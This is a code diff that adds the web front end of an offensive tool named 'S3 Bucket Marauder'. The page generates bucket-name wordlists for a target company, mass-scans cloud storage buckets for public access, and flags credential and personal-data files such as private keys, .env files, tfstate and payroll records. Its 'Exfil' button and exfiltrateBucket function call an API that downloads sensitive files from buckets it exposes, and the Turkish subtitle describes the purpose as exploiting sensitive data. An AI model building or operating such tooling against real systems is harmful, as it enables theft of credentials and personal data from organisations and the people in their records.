@@ -1,0 +1,458 @@
+{% extends "base.html" %}
+
+{% block title %}S3 Bucket Marauder - Cloud Storage Reconnaissance{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                <span class="text-4xl">🪣</span>
+                S3 Bucket Marauder
+                <span class="px-3 py-1 text-sm font-bold bg-gradient-to-r from-green-500 to-emerald-500 rounded-full">PRO</span>
+            </h1>
+            <p class="text-gray-400 mt-2">Açık S3 bucket'larını bul, hassas verileri sömür</p>
+        </div>
+        <a href="{{ url_for('main.dashboard') }}" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white transition">
+            ← Dashboard
+        </a>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Wordlist Generator -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>📝</span> Wordlist Generator
+            </h2>
+
+            <form id="wordlistForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Company/Target Name</label>
+                    <input type="text" id="companyName" placeholder="acmecorp"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-green-500 focus:outline-none">
+                </div>
+
+                <div class="flex items-center gap-2">
+                    <input type="checkbox" id="includeRegions"
+                        class="w-4 h-4 rounded bg-gray-700 border-gray-600 text-green-500 focus:ring-green-500">
+                    <label class="text-sm text-gray-300">Include region variations</label>
+                </div>
+
+                <button type="submit" class="w-full py-2 bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 rounded-lg text-white font-semibold transition">
+                    🔧 Generate Wordlist
+                </button>
+            </form>
+
+            <div id="wordlistResult" class="hidden mt-4">
+                <div class="flex items-center justify-between mb-2">
+                    <span class="text-green-400 font-medium">Generated Names</span>
+                    <span id="wordlistCount" class="text-white bg-green-500/20 px-2 py-1 rounded text-sm"></span>
+                </div>
+                <div id="wordlistPreview" class="max-h-40 overflow-y-auto bg-gray-900 rounded-lg p-3 text-xs text-gray-400 font-mono"></div>
+                <button onclick="downloadWordlist()" class="mt-2 w-full py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white text-sm transition">
+                    📥 Download Wordlist
+                </button>
+            </div>
+        </div>
+
+        <!-- Single Bucket Check -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>🔍</span> Quick Bucket Check
+            </h2>
+
+            <form id="checkForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Bucket Name</label>
+                    <input type="text" id="bucketName" placeholder="target-company-backup"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-green-500 focus:outline-none">
+                </div>
+
+                <button type="submit" class="w-full py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white font-semibold transition">
+                    🔎 Check Bucket
+                </button>
+            </form>
+
+            <div id="checkResult" class="hidden mt-4 p-4 rounded-lg">
+                <div class="flex items-center gap-2 mb-2">
+                    <span id="checkStatus" class="text-lg"></span>
+                    <span id="checkStatusText" class="font-medium"></span>
+                </div>
+                <div id="checkDetails" class="text-sm text-gray-400 space-y-1"></div>
+            </div>
+        </div>
+
+        <!-- Scan Statistics -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>📊</span> Scan Statistics
+            </h2>
+
+            <div class="space-y-4">
+                <div class="flex items-center justify-between p-3 bg-gray-700/50 rounded-lg">
+                    <span class="text-gray-400">Total Findings</span>
+                    <span id="statFindings" class="text-2xl font-bold text-white">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-green-500/10 border border-green-500/30 rounded-lg">
+                    <span class="text-green-400">Public Buckets</span>
+                    <span id="statPublic" class="text-2xl font-bold text-green-400">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
+                    <span class="text-yellow-400">Listable Buckets</span>
+                    <span id="statListable" class="text-2xl font-bold text-yellow-400">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
+                    <span class="text-red-400">Interesting Files</span>
+                    <span id="statFiles" class="text-2xl font-bold text-red-400">0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mass Scan -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>🚀</span> Mass Bucket Scan
+        </h2>
+
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">Target Company</label>
+                <input type="text" id="scanCompany" placeholder="acmecorp"
+                    class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-green-500 focus:outline-none">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">Max Buckets</label>
+                <input type="number" id="maxBuckets" value="500"
+                    class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-green-500 focus:outline-none">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">Threads</label>
+                <input type="number" id="scanThreads" value="20"
+                    class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-green-500 focus:outline-none">
+            </div>
+            <div class="flex items-end">
+                <button id="startScanBtn" onclick="startScan()" class="w-full py-2 bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 rounded-lg text-white font-semibold transition">
+                    ▶️ Start Scan
+                </button>
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div id="scanProgress" class="hidden mb-4">
+            <div class="flex items-center justify-between mb-2">
+                <span class="text-gray-400">Scanning: <span id="currentBucket" class="text-green-400 font-mono text-sm"></span></span>
+                <span class="text-white"><span id="progressCount">0</span> / <span id="progressTotal">0</span></span>
+            </div>
+            <div class="w-full bg-gray-700 rounded-full h-2">
+                <div id="progressBar" class="bg-gradient-to-r from-green-500 to-emerald-500 h-2 rounded-full transition-all" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <!-- Results Table -->
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm">
+                <thead class="text-gray-400 border-b border-gray-700">
+                    <tr>
+                        <th class="text-left py-3 px-4">Bucket Name</th>
+                        <th class="text-left py-3 px-4">Status</th>
+                        <th class="text-left py-3 px-4">Region</th>
+                        <th class="text-left py-3 px-4">Permissions</th>
+                        <th class="text-left py-3 px-4">Interesting Files</th>
+                        <th class="text-left py-3 px-4">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="scanResults" class="text-gray-300">
+                    <tr>
+                        <td colspan="6" class="text-center py-8 text-gray-500">No scan results yet</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Sensitive File Patterns -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>🎯</span> Sensitive File Detection Patterns
+        </h2>
+
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <div class="p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
+                <h3 class="text-red-400 font-medium mb-2">🔴 Critical</h3>
+                <ul class="text-xs text-gray-400 space-y-1 font-mono">
+                    <li>• .pem, .key, .p12, .pfx</li>
+                    <li>• id_rsa, id_dsa, id_ecdsa</li>
+                    <li>• .env, credentials, secrets</li>
+                    <li>• terraform.tfstate</li>
+                    <li>• kubeconfig, docker config</li>
+                    <li>• wp-config.php, database.yml</li>
+                </ul>
+            </div>
+
+            <div class="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
+                <h3 class="text-yellow-400 font-medium mb-2">🟡 High</h3>
+                <ul class="text-xs text-gray-400 space-y-1 font-mono">
+                    <li>• .sql, .dump, backup.*</li>
+                    <li>• .bak, .backup, .old</li>
+                    <li>• .csv, .xlsx (user data)</li>
+                    <li>• payroll, salary, ssn</li>
+                    <li>• .sqlite, .db, .mdb</li>
+                    <li>• git-credentials, .history</li>
+                </ul>
+            </div>
+
+            <div class="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
+                <h3 class="text-blue-400 font-medium mb-2">🔵 Medium</h3>
+                <ul class="text-xs text-gray-400 space-y-1 font-mono">
+                    <li>• .doc, .docx, .pdf</li>
+                    <li>• confidential, internal</li>
+                    <li>• .log, .config, .conf</li>
+                    <li>• .json, .yaml, .xml</li>
+                    <li>• readme, changelog</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let scanInterval = null;
+let currentCompany = '';
+
+document.getElementById('wordlistForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const company = document.getElementById('companyName').value;
+    const includeRegions = document.getElementById('includeRegions').checked;
+    
+    if (!company) {
+        alert('Company name is required');
+        return;
+    }
+    
+    currentCompany = company;
+    
+    try {
+        const response = await fetch('/s3-marauder/api/generate-wordlist', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ company_name: company, include_regions: includeRegions })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('wordlistCount').textContent = result.total_names + ' names';
+            document.getElementById('wordlistPreview').textContent = result.sample.join('\n');
+            document.getElementById('wordlistResult').classList.remove('hidden');
+        } else {
+            alert('Error: ' + result.error);
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+});
+
+async function downloadWordlist() {
+    if (!currentCompany) return;
+    
+    const response = await fetch('/s3-marauder/api/download-wordlist', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ company_name: currentCompany })
+    });
+    
+    const blob = await response.blob();
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `${currentCompany}_s3_wordlist.txt`;
+    a.click();
+}
+
+document.getElementById('checkForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const bucket = document.getElementById('bucketName').value;
+    if (!bucket) return;
+    
+    try {
+        const response = await fetch('/s3-marauder/api/check-bucket', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ bucket_name: bucket })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            const finding = result.finding;
+            const resultDiv = document.getElementById('checkResult');
+            
+            let statusIcon, statusText, bgColor;
+            switch (finding.status) {
+                case 'exists_public':
+                    statusIcon = '✅';
+                    statusText = 'PUBLIC!';
+                    bgColor = 'bg-green-500/20 border border-green-500/50';
+                    break;
+                case 'exists_private':
+                    statusIcon = '🔒';
+                    statusText = 'Private (exists)';
+                    bgColor = 'bg-yellow-500/20 border border-yellow-500/50';
+                    break;
+                case 'not_found':
+                    statusIcon = '❌';
+                    statusText = 'Not Found';
+                    bgColor = 'bg-gray-700';
+                    break;
+                default:
+                    statusIcon = '❓';
+                    statusText = finding.status;
+                    bgColor = 'bg-gray-700';
+            }
+            
+            document.getElementById('checkStatus').textContent = statusIcon;
+            document.getElementById('checkStatusText').textContent = statusText;
+            document.getElementById('checkStatusText').className = finding.status === 'exists_public' ? 'font-medium text-green-400' : 'font-medium text-gray-300';
+            
+            let details = `Region: ${finding.region}`;
+            if (finding.list_allowed) details += '\n✓ Listing allowed!';
+            if (finding.interesting_files.length > 0) {
+                details += `\n🎯 ${finding.interesting_files.length} interesting files found!`;
+            }
+            document.getElementById('checkDetails').innerHTML = details.replace(/\n/g, '<br>');
+            
+            resultDiv.className = `mt-4 p-4 rounded-lg ${bgColor}`;
+            resultDiv.classList.remove('hidden');
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+});
+
+async function startScan() {
+    const company = document.getElementById('scanCompany').value;
+    const maxBuckets = document.getElementById('maxBuckets').value;
+    const threads = document.getElementById('scanThreads').value;
+    
+    if (!company) {
+        alert('Company name is required');
+        return;
+    }
+    
+    try {
+        const response = await fetch('/s3-marauder/api/start-scan', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                company_name: company,
+                max_buckets: parseInt(maxBuckets),
+                threads: parseInt(threads)
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('scanProgress').classList.remove('hidden');
+            document.getElementById('startScanBtn').disabled = true;
+            document.getElementById('startScanBtn').textContent = '⏳ Scanning...';
+            
+            // Start polling for status
+            scanInterval = setInterval(updateScanStatus, 1000);
+        } else {
+            alert('Error: ' + result.error);
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+}
+
+async function updateScanStatus() {
+    try {
+        const response = await fetch('/s3-marauder/api/scan-status');
+        const status = await response.json();
+        
+        document.getElementById('progressCount').textContent = status.progress;
+        document.getElementById('progressTotal').textContent = status.total;
+        document.getElementById('currentBucket').textContent = status.current_bucket;
+        
+        const percent = status.total > 0 ? (status.progress / status.total) * 100 : 0;
+        document.getElementById('progressBar').style.width = percent + '%';
+        
+        // Update results table
+        if (status.findings.length > 0) {
+            const tbody = document.getElementById('scanResults');
+            tbody.innerHTML = status.findings.map(f => `
+                <tr class="border-b border-gray-700 hover:bg-gray-700/50">
+                    <td class="py-3 px-4 font-mono text-sm">${f.bucket_name}</td>
+                    <td class="py-3 px-4">
+                        <span class="px-2 py-1 rounded text-xs ${f.status === 'exists_public' ? 'bg-green-500/20 text-green-400' : 'bg-yellow-500/20 text-yellow-400'}">
+                            ${f.status}
+                        </span>
+                    </td>
+                    <td class="py-3 px-4">${f.region}</td>
+                    <td class="py-3 px-4">
+                        ${f.list_allowed ? '📋 List' : ''}
+                        ${f.read_allowed ? '📖 Read' : ''}
+                    </td>
+                    <td class="py-3 px-4">
+                        ${f.interesting_files.length > 0 ? `<span class="text-red-400">${f.interesting_files.length} files</span>` : '-'}
+                    </td>
+                    <td class="py-3 px-4">
+                        ${f.list_allowed ? `<button onclick="exfiltrateBucket('${f.bucket_name}', '${f.region}')" class="px-2 py-1 bg-red-500/20 text-red-400 rounded text-xs hover:bg-red-500/30">Exfil</button>` : ''}
+                    </td>
+                </tr>
+            `).join('');
+        }
+        
+        // Update statistics
+        updateStatistics(status.findings);
+        
+        if (status.completed || !status.running) {
+            clearInterval(scanInterval);
+            document.getElementById('startScanBtn').disabled = false;
+            document.getElementById('startScanBtn').textContent = '▶️ Start Scan';
+        }
+    } catch (error) {
+        console.error('Status update failed:', error);
+    }
+}
+
+function updateStatistics(findings) {
+    const publicBuckets = findings.filter(f => f.status === 'exists_public').length;
+    const listable = findings.filter(f => f.list_allowed).length;
+    const interestingFiles = findings.reduce((sum, f) => sum + f.interesting_files.length, 0);
+    
+    document.getElementById('statFindings').textContent = findings.length;
+    document.getElementById('statPublic').textContent = publicBuckets;
+    document.getElementById('statListable').textContent = listable;
+    document.getElementById('statFiles').textContent = interestingFiles;
+}
+
+async function exfiltrateBucket(bucketName, region) {
+    if (!confirm(`Exfiltrate sensitive files from ${bucketName}?`)) return;
+    
+    try {
+        const response = await fetch('/s3-marauder/api/exfiltrate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ bucket_name: bucketName, region: region, max_files: 50 })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            alert(`Downloaded ${result.files_downloaded} files!`);
+        } else {
+            alert('Error: ' + result.error);
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+}
+</script>
+{% endblock %}
